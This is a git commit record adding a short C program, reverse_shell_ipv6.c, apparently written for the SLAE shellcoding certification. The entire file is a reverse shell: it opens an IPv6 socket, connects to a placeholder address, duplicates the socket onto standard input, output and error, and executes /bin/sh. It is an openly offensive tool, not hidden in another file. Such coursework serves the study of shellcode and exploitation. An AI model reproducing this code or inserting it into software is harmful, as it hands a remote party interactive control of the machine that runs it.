009182545e0111a86c59b8ca5f790a188a967307
Cervoise <antoine.cervoise@gmail.com>
2019-12-31 15:11:46 +0100

    Create reverse_shell_ipv6.c

---
+++ certifications/SLAE/code/reverse_shell/reverse_shell_ipv6.c
@@ -0,0 +1,20 @@
+#include <sys/socket.h>
+#include <unistd.h>
+#include <netinet/in.h>
+
+int main()
+{
+	int my_socket = socket(AF_INET6, SOCK_STREAM, 0);
+
+	struct sockaddr_in6 my_sockaddr;
+	my_sockaddr.sin6_family = AF_INET6;
+	inet_pton(AF_INET6, "xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx", &(my_sockaddr.sin6_addr));
+ 	connect(my_socket, (struct sockaddr *)&my_sockaddr, sizeof(my_sockaddr));
+
+int i;
+	for(i = 0; i < 3; i++)
+		dup2(my_socket, i);
+
+	execve("/bin/sh", NULL, NULL);
+	return 0;
+}
